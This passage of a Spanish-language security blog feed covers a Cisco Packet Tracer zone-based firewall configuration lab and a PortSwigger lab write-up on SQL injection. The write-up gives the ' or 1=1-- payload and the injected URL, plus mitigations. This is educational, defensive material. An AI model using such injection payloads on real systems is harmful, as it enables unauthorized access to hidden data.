Firewall</strong></h4> <p><strong>Desde PC-C</strong> <code class="language-plaintext highlighter-rouge">ping 192.168.3.3</code></p> <p><strong>Desde PC-A</strong></p> <p><code class="language-plaintext highlighter-rouge">ping 192.168.1.3</code></p> <p><strong>Desde PC-C</strong></p> <p><code class="language-plaintext highlighter-rouge">http://192.168.3.3</code></p> <p><strong>Desde PC-A</strong></p> <p><code class="language-plaintext highlighter-rouge">http://192.168.1.3</code></p> <p><strong>Estableciendo sesión SSH por la interface S/0/0/1 en R2 desde ambas Pcs</strong></p> <p>Desde pc-a y pc-c</p> <p><code class="language-plaintext highlighter-rouge">C:\&gt;ssh -l Admin 10.2.2.2</code></p> <h4 id="parte-2---creación-de-2-zonas-seguras-en-r3---estas-deben-ser-interna-y-externa"><strong>Parte 2 - Creación de 2 zonas seguras en R3 - estas deben ser interna y externa</strong></h4> <ul> <li><strong>a.</strong> Creando las zonas IN-ZONE Y OUT-ZONE<br/> <strong>Comandos implementados</strong> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  R3#conf ter
  R3(config)#zone security IN-ZONE
  R3(config-sec-zone)#exit
  R3(config)#zone security OUT-ZONE
  R3(config-sec-zone)#
</code></pre></div> </div> </li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-02-480.webp 480w,/assets/img/ZPF-02-800.webp 800w,/assets/img/ZPF-02-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-02.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h4 id="parte-3-configuración-de-un-class-map"><strong>Parte 3: Configuración de un class map</strong></h4> <p>configurar un class map que coincida con todas las direcciones IP de la red interna. Primero, crear una ACL que defina la red interna en R3. También crear un map-class para inspeccionar el tráfico interno.</p> <ul> <li><strong>a.</strong> Creación de la class map<br/></li> </ul> <p><strong>Comandos implementados</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R3(config)#access-list 101 permit ip 192.168.3.0 0.0.0.255 any
R3(config)#class-map type inspect match-all IN-NET-CLASS-MAP
R3(config-cmap)#match access-group 101
R3(config-cmap)#exit
</code></pre></div></div> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-03-480.webp 480w,/assets/img/ZPF-03-800.webp 800w,/assets/img/ZPF-03-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-03.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h4 id="parte-4-configurar-y-aplicar-las-póliticas-de-firewall"><strong>Parte 4: Configurar y aplicar las póliticas de Firewall</strong></h4> <p>Crear un policy map para inspeccionar el tráfico</p> <p><strong>Comandos implementados</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R3(config)#policy-map type inspect IN-2-OUT-PMAP
R3(config-pmap)#class type inspect IN-NET-CLASS-MAP
R3(config-pmap-c)#inspect
R3(config-pmap-c)#
</code></pre></div></div> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-04-480.webp 480w,/assets/img/ZPF-04-800.webp 800w,/assets/img/ZPF-04-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-04.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>Definir las zonas de origen y destino especificadas en el inciso anterior</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R3(config)#zone-pair security IN-2-OUT-ZPAIR source IN-ZONE destination OUT-ZONE
R3(config-sec-zone-pair)#service-policy type inspect IN-2-OUT-PMAP
R3(config-sec-zone-pair)#
</code></pre></div></div> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-05-480.webp 480w,/assets/img/ZPF-05-800.webp 800w,/assets/img/ZPF-05-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-05.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h4 id="parte-5-asignación-de-la-interfaz-a-las-zonas-de-seguridad-creadas"><strong>Parte 5: Asignación de la interfaz a las zonas de seguridad creadas</strong></h4> <p>Asignamos la interfaz correcta a la zona de seguridad interna en R3</p> <p><strong>Comandos implementados</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R3(config)#interface g0/1
R3(config-if)#zone-member security IN-ZONE
R3(config-if)#
</code></pre></div></div> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-06-480.webp 480w,/assets/img/ZPF-06-800.webp 800w,/assets/img/ZPF-06-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-06.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>Asignamos la interfaz correcta a la zona de seguridad externa en R3</p> <p><strong>Comandos implementados</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R3(config)#interface s0/0/1
R3(config-if)#zone-member security OUT-ZONE
R3(config-if)#
</code></pre></div></div> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-07-480.webp 480w,/assets/img/ZPF-07-800.webp 800w,/assets/img/ZPF-07-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-07.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p><strong>Nota:</strong> Este laboratorio es parte del curso <strong>Network Defense</strong> de Cisco Network Academy</p>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="SOC,"/><category term="Packet"/><category term="Tracer,"/><category term="Configuración"/><category term="redes,"/><category term="ciberseguridad,"/><category term="Network"/><category term="Defense,"/><category term="ipv6,"/><category term="ZPF"/><summary type="html"><![CDATA[Configuración de un ZPF]]></summary></entry><entry><title type="html">Burpsuite - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title><link href="https://sefamol.github.io/blog/2024/Burpsuite-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data/" rel="alternate" type="text/html" title="Burpsuite - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"/><published>2024-12-10T21:50:00+00:00</published><updated>2024-12-10T21:50:00+00:00</updated><id>https://sefamol.github.io/blog/2024/Burpsuite%20-%20SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data</id><content type="html" xml:base="https://sefamol.github.io/blog/2024/Burpsuite-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Software</strong>: Burpsuite Community</li> <li><strong>Dificultad</strong>: Fácil</li> <li><strong>Duracion</strong>: 10 minutos</li> <li><strong>Observaciones</strong>: Se realizo la inyección de manera simple desde la url.</li> <li><strong>CVSS 3.1</strong>: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L <strong>9.1 Crítico</strong></li> </ul> <h2 id="reconocimiento"><strong>Reconocimiento</strong></h2> <ul> <li>Dada la naturaleza del laboratorio se presento un solo endpoint <strong>category</strong> el cual se mostraba vulnerable a la inyección.</li> </ul> <hr/> <h2 id="explicación-de-la-vulnerabilidad"><strong>Explicación de la vulnerabilidad</strong></h2> <p>La vulnerabilidad afecta a una base de datos que no tiene consultas parametrizadas y/o no esta sanitizada, lo que permite la inyección de código en una petición.</p> <p>Una consulta esperada a la base de datos tiene la siguiente forma:<br/></p> <p><code class="language-plaintext highlighter-rouge">...academy.net/filter?category=Corporate+gifts</code></p> <p>Y en la Base de Datos se ve de la siguiente manera:</p> <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code> <br/></p> <p>en este sentido realizar la prueba de inyección SQL utilizando la prueba clasica <strong>‘or1=1–</strong> donde:</p> <ul> <li><strong>‘</strong>: Se utiliza para terminar el valor esperado del campo category.</li> <li><strong>OR</strong>: Operador lógico que permite ingresar una condición verdadera o no con la intención de evadir controles.</li> <li><strong>1=1</strong>: Condición que siempre es verdadera.</li> </ul> <hr/> <h2 id="solución-del-laboratorio"><strong>Solución del laboratorio</strong></h2> <p>Podemos notar que existe un menu de busqueda que permite ingresar a categorias de los productos de la web</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/Burp-SQL-01-02-480.webp 480w,/assets/img/Burp-SQL-01-02-800.webp 800w,/assets/img/Burp-SQL-01-02-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/Burp-SQL-01-02.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Notamos que ingresando por ese menu la web despliega la siguiente url</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/Burp-SQL-01-03-480.webp 480w,/assets/img/Burp-SQL-01-03-800.webp 800w,/assets/img/Burp-SQL-01-03-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/Burp-SQL-01-03.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Insertamos el payload en la url de la siguiente manera:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a2e006a04e7be4f8222664a00b10018.web-security-academy.net/filter?category=%27+or+1=1--
</code></pre></div></div> <p>Dando como resultado la solución del laboratorio</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/Burp-SQL-01-01-480.webp 480w,/assets/img/Burp-SQL-01-01-800.webp 800w,/assets/img/Burp-SQL-01-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/Burp-SQL-01-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <hr/> <h2 id="mitigación"><strong>Mitigación</strong></h2> <ul> <li> <p><strong>Realizar consultas parametrizadas</strong> Evitar la concatenación de entradas de usuario en las consultas.</p> </li> <li> <p><strong>Validación de entradas</strong> Asegurar que las entradas de usuario sean saneadas y validadas antes de procesarlas.</p> </li> </ul> <p><strong>URL del laboratorio:</strong> https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data</p>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="Burpsuite,"/><category term="Portswigger,"/><category term="pentesting,"/><category term="ciberseguridad,"/><category term="Web,"/><category term="Inyección"/><category term="SQL"/><summary type="html"><![CDATA[Laboratorio introductorio a inyección SQL]]></summary></entry></feed>